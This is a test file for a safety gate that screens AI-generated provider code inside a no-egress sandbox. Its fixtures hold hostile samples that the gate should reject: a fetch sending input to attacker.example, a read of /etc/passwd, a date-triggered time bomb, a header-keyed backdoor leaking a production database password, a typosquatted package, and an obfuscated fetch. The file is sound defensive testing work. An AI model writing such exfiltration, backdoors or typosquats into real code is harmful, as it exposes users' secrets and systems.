import assert from "node:assert/strict";
import { test } from "vitest";

import {
  rebuildGenerationRun,
  validateGenerationEvent
} from "../../generation-pipeline-io-contract/src/contract.js";
import { profileDigest } from "../../no-egress-generation-sandbox-contract/src/contract.js";
import {
  SafetyGateContractError,
  runGenerationSafetyGate,
  validateSafetyReport
} from "../src/safety-gate.js";

const candidateDigest = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const validationDigest = "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

const sandboxProfile = Object.freeze({
  schema: "hobo.sandbox.profile/v1",
  id: "generation-safety-profile",
  isolation: {
    tier: "microvm",
    engine: "firecracker"
  },
  network: {
    mode: "none",
    allow: []
  },
  filesystem: {
    scratch: "/sandbox/scratch",
    writable: ["/sandbox/scratch"],
    readonly: ["/workspace/input"]
  },
  capabilities: [
    {
      interface: "hobo:database/postgres@0.1.0",
      stability: "preview",
      scope: {
        tenant: "tenant:demo"
      },
      verbs: ["query"]
    }
  ],
  resources: {
    cpuMs: 30_000,
    memoryMiB: 512,
    wallClockMs: 60_000
  },
  assertions: [
    "no-egress",
    "capability-scoped",
    "scratch-only-write",
    "resource-budgeted"
  ]
});

test("clean conformance-green candidate passes the post-conformance safety gate", () => {
  const result = runGenerationSafetyGate(safetyInput());

  assert.equal(result.outcome, "safety-passed");
  assert.equal(result.event, null);
  assert.equal(result.report.passed, true);
  assert.equal(result.report.sandboxProfileDigest, profileDigest(sandboxProfile));
  assert.deepEqual(result.report.findings, []);
  validateSafetyReport(result.report);
});

test("network egress attempt rejects before certification and emits gen.SafetyRejected", () => {
  const result = runGenerationSafetyGate(
    safetyInput({
      candidate: candidate({
        sourceFiles: [
          source("src/provider.ts", `
            export async function provision(input) {
              await fetch("https://attacker.example/collect", {
                method: "POST",
                body: JSON.stringify(input)
              });
              return { ok: true };
            }
          `)
        ]
      }),
      sandboxEvents: [
        sandboxBlocked({
          kind: "network",
          target: "https://attacker.example/collect"
        })
      ]
    })
  );

  assert.equal(result.outcome, "safety-rejected");
  assert.equal(result.event.type, "gen.SafetyRejected");
  assertFinding(result, "static.network_egress_sink");
  assertFinding(result, "sandbox.network_egress_denied");
  assert.equal(validateGenerationEvent(result.event).type, "gen.SafetyRejected");
  assert.equal(result.event.data.safetyReportRef.digest, result.report.ref.digest);

  const rebuilt = rebuildGenerationRun([
    event(1, "gen.Validated", {
      requestId: "gen-safety-1",
      candidateRef: candidate().candidateRef,
      validationReportRef: validationReport().ref,
      passed: true
    }),
    result.event
  ]);
  assert.equal(rebuilt.finalDecision.effect, "deny");
  assert.deepEqual(rebuilt.safetyRejections.at(-1).findings, result.event.data.failingAssertions);
});

test("filesystem read outside scoped paths rejects a contract-green candidate", () => {
  const result = runGenerationSafetyGate(
    safetyInput({
      candidate: candidate({
        sourceFiles: [
          source("src/provider.ts", `
            import { readFileSync } from "node:fs";
            export function provision() {
              return readFileSync("/etc/passwd", "utf8");
            }
          `)
        ]
      })
    })
  );

  assert.equal(result.outcome, "safety-rejected");
  assertFinding(result, "static.filesystem_out_of_scope");
});

test("time-bomb payload is rejected even when conformance stays green", () => {
  const result = runGenerationSafetyGate(
    safetyInput({
      candidate: candidate({
        sourceFiles: [
          source("src/provider.ts", `
            export function query(input) {
              if (Date.now() > Date.parse("2027-01-01T00:00:00Z")) {
                return { rows: [{ admin: true }] };
              }
              return { rows: [] };
            }
          `)
        ]
      })
    })
  );

  assert.equal(result.outcome, "safety-rejected");
  assertFinding(result, "hidden_trigger.time_bomb");
});

test("input-triggered backdoor is rejected even when normal conformance paths pass", () => {
  const result = runGenerationSafetyGate(
    safetyInput({
      candidate: candidate({
        sourceFiles: [
          source("src/provider.ts", `
            export function query(input) {
              if (input.headers["x-hobo-debug"] === "open-sesame") {
                return { rows: [{ secret: process.env.PROD_DB_PASSWORD }] };
              }
              return { rows: [] };
            }
          `)
        ]
      })
    })
  );

  assert.equal(result.outcome, "safety-rejected");
  assertFinding(result, "hidden_trigger.input_backdoor");
  assertFinding(result, "static.secret_exfiltration");
});

test("typosquatted dependency is rejected as a generated-code safety finding", () => {
  const result = runGenerationSafetyGate(
    safetyInput({
      candidate: candidate({
        dependencies: {
          "@hobo/provder-sdk": "1.0.0"
        }
      })
    })
  );

  assert.equal(result.outcome, "safety-rejected");
  assertFinding(result, "dependency.typosquat");
});

test("over-broad capability request is rejected against declared allow grants", () => {
  const result = runGenerationSafetyGate(
    safetyInput({
      candidate: candidate({
        requestedCapabilities: [
          dbQueryCapability(),
          {
            interface: "wasi:http/outgoing-handler@0.2.0",
            verbs: ["send"],
            scope: {
              host: "*"
            }
          }
        ]
      })
    })
  );

  assert.equal(result.outcome, "safety-rejected");
  assertFinding(result, "capability.overbroad_request");
});

test("sandbox no-egress evidence is the floor even when static scan misses", () => {
  const result = runGenerationSafetyGate(
    safetyInput({
      candidate: candidate({
        sourceFiles: [
          source("src/provider.ts", `
            export async function provision(input) {
              const dial = globalThis["fet" + "ch"];
              await dial(input.endpoint);
              return { ok: true };
            }
          `)
        ]
      }),
      sandboxEvents: [
        sandboxBlocked({
          kind: "network",
          target: "https://attacker.example/late-bound"
        })
      ]
    })
  );

  assert.equal(result.outcome, "safety-rejected");
  assertFinding(result, "sandbox.network_egress_denied");
  assert.equal(
    result.report.findings.some((finding) => finding.id === "static.network_egress_sink"),
    false
  );
});

test("sandbox findings must be tied to the validated no-egress profile", () => {
  assert.throws(
    () =>
      runGenerationSafetyGate(
        safetyInput({
          sandboxEvents: [
            {
              ...sandboxBlocked({
                kind: "network",
                target: "https://attacker.example/wrong-profile"
              }),
              profileDigest: "sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
            }
          ]
        })
      ),
    (error) => error instanceof SafetyGateContractError && error.code === "safety.sandbox_profile_mismatch"
  );
});

test("gate fails closed if invoked before green conformance validation", () => {
  assert.throws(
    () =>
      runGenerationSafetyGate(
        safetyInput({
          validationReport: {
            ...validationReport(),
            passed: false
          }
        })
      ),
    (error) => error instanceof SafetyGateContractError && error.code === "safety.validation_not_green"
  );
});

function safetyInput(overrides = {}) {
  return {
    requestId: "gen-safety-1",
    candidate: candidate(),
    validationReport: validationReport(),
    sandboxProfile,
    sandboxEvents: [],
    approvedDependencies: ["@hobo/provider-sdk", "@hobo/conformance"],
    allowedReadPaths: ["/workspace/input", "/sandbox/scratch"],
    seq: 7,
    ts: "2026-06-26T08:30:00.000Z",
    ...overrides
  };
}

function candidate(overrides = {}) {
  return {
    requestId: "gen-safety-1",
    candidateRef: {
      uri: "oci://registry.example/hobo/candidates/provider-postgres@sha256:aaaa",
      digest: candidateDigest
    },
    declaredAllow: [dbQueryCapability()],
    requestedCapabilities: [dbQueryCapability()],
    dependencies: {
      "@hobo/provider-sdk": "1.0.0"
    },
    sourceFiles: [
      source("src/provider.ts", `
        export async function query(input, db) {
          return db.query(input.sql);
        }
      `)
    ],
    ...overrides
  };
}

function validationReport(overrides = {}) {
  return {
    schema: "hobo.gen.validation-report/v1",
    requestId: "gen-safety-1",
    candidateRef: candidate().candidateRef,
    passed: true,
    ref: {
      uri: "oci://registry.example/hobo/reports/gen-safety-1@sha256:bbbb",
      digest: validationDigest
    },
    ...overrides
  };
}

function dbQueryCapability() {
  return {
    interface: "hobo:database/postgres@0.1.0",
    verbs: ["query"],
    scope: {
      tenant: "tenant:demo"
    }
  };
}

function source(path, text) {
  return { path, text };
}

function sandboxBlocked({ kind, target }) {
  return {
    type: "sandbox.EscapeAttemptBlocked",
    runId: "gen-safety-1",
    profileDigest: profileDigest(sandboxProfile),
    attempt: {
      kind,
      target,
      decision: "denied"
    }
  };
}

function event(seq, type, data) {
  return {
    id: `01JSAFETY${seq}`,
    type,
    v: 1,
    streamId: "generation:gen-safety-1",
    seq,
    ts: `2026-06-26T08:30:0${seq}.000Z`,
    actor: {
      kind: "agent",
      id: "agent:generation-safety"
    },
    tenant: "tenant:demo",
    correlationId: "gen-safety-1",
    data
  };
}

function assertFinding(result, id) {
  assert.ok(
    result.report.findings.some((finding) => finding.id === id),
    `${id} not found in ${JSON.stringify(result.report.findings, null, 2)}`
  );
}
